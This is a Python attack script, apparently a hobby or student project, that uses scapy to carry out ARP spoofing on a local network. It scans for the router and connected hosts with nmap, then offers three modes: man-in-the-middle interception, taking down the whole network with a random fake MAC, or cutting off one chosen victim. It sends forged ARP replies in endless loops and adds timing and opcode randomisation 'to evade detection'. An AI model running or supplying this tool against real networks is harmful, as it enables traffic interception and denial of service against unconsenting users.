import subprocess, time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send

from victim import Victim
from attacker import Attacker
from network import Network
from color import Color #used to output to the terminals with colors

from random import randint
from random import seed

def initialize():
    #get router information
    Color.pl("{?} Doing pings to discover the router")
    time.sleep(2)
    # clear arp table
    subprocess.call(["ip", "neigh", "flush", "all"])
    # used to make sure the router has been added to the ARP table
    subprocess.call(["ping", "8.8.8.8", "-c", "2"])
    # neighbors table (ARP)
    command = "ip neigh"
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    routerIP = commandOutput[0].split()[0][2:]
    routerMAC = commandOutput[0].split()[4]

    # get ip information
    command = 'ifconfig'
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    attackerIP = commandOutput[1].split()[1]
    attackerMAC = commandOutput[3].split()[1]
    broadcastIP = commandOutput[1].split()[-1]

    # discover users connected to router by running nmap on the router and filtering the output in the format we need
    command = "nmap "+ routerIP +"/24 -sP | grep 'report\|MAC'"

    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))[2:] # run the comand and remove "b'" from the beginning
    connectedDevices = commandOutput.split('\\n')[2:-1] #remove first two elemntsbecause the are the router, and remove the last element which is a "'"

    victimList = [] # list we are going to use and popsulate it with possible victims
    for i in range(0, len(connectedDevices)-1, 2):
        ip = connectedDevices[i].split()[4]
        mac = connectedDevices[i+1].split()[2]
        if ip != attackerIP:
            victimList.append(Victim([ip, mac]))
    network = Network([routerIP, routerMAC, broadcastIP])
    attacker = Attacker([attackerIP, attackerMAC])
    return (network, attacker, victimList)

#generate random MAC address
def generateMAC(seed_value):
    mac = ""
    seed(seed_value)
    for i in range(6):
        char1 = hex(randint(0, 15))[2:] #remove 0x from the beginnign of the hex
        char2 = hex(randint(0, 15))[2:]
        mac += char1 + char2 + ":"
    return mac[:-1] #remove trailing ":"

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    takedown=False
    specific=False
    # seed(655)
    (network, attacker, victimsList) = initialize()
    Color.pl("{+} " + network.toString())
    Color.pl("{+} " + attacker.toString())
    for e in victimsList:
        Color.pl("{!} " + e.toString())

    # select type of attack
    while(True):
        Color.pl("{?} What type of ARP attack do you want to perform? \n {C}Man-in-the-middle[1] {W}or {O}Take down the network![2] {W}or {P}{D}Attack specific victim[3]?)")
        selection = input()
        routerIP=network.ip
        # attacking down the whole network by specifying a non existent MAC
        if selection.lower() == "2":
            takedown = True
            ip=network.broadcastIP
            mac=generateMAC(randint(0, 655)) #random
            break
        # attacking a specific target and not allowing it to connect to the internet by specifying a non existent MAC
        elif selection.lower()=="3":
            specific=True
            mac=generateMAC(randint(0, 655)) #random
            break
        # Man in the Middle needs handling that is done later
        elif selection.lower() == "1":
            break
        else:
            Color.pl("{!} Invalid Input")

    while(not takedown):
        Color.pl("{?} Do you want to enter the target manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter target IP address ")
            ip = input().strip()
            if not specific:
                Color.pl("{+} Enter target MAC address ")
                mac = input().strip()
            break
        elif selection.lower() == "n":
            for i in range(len(victimsList)):
                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
            Color.pl("{+} Enter Index of Target")
            index = int(input())
            ip = victimsList[index].ip
            if not specific:
                mac = victimsList[index].mac
            break
        else:
            Color.pl("{!} Invalid Input")

    while(not takedown):
        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter router IP address ")
            routerIP = input().strip()
            break
        elif selection.lower() == "n":
            routerIP = network.ip
            break
        else:
            Color.pl("{!} Invalid Input")

    # printing Target IP, IP and MAC Entry that is getting changed
    Color.pl("{+} {R} Target IP: {G}" + ip)
    Color.pl("{+} {R} ARP table changed combination IP: {G}" + routerIP + "  {R} MAC: {G}" + mac)
    time.sleep(2)

    Color.pl("{+} Processing :) ")

    '''
    pdst is the ip of the target that we want to change its ARP table
    psrc is the ip in the ARP table that we want to change its associated MAC address
    hwsrc is the MAC address that we replace with in the ARP table, no value for it uses the MAC of the attacker

    Every time we send an ARP message, we also send one to change the attacker IP and MAC in order to not have 
    duplicate MAC in the ARP table 
    '''

    if (not takedown and not specific): #man in the middle needs to change ARP table for both router and target
        arp_target_router = ARP(op=2, psrc=routerIP, pdst=ip)
        arp_target_attacker = ARP(op=2, psrc=attacker.ip, pdst=ip, hwsrc=generateMAC(randint(0, 655)))
        arp_router = ARP(op=2, psrc=ip, pdst=routerIP)
        while 1:
            send(arp_target_router)
            send(arp_target_attacker)
            send(arp_router)
            time.sleep(1)
    else:
        counter=0
        while 1:
            #randomizer to evade detection
            if (counter % 5 == 0):
                op = randint(1, 2)
                s = randint(0, 2)
            counter += 1
            # creating the arp packet using scapy
            arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
            send(arp)
            # lower sleep timer to make it better, victim ajusts ARP table otherwise
            time.sleep(s)
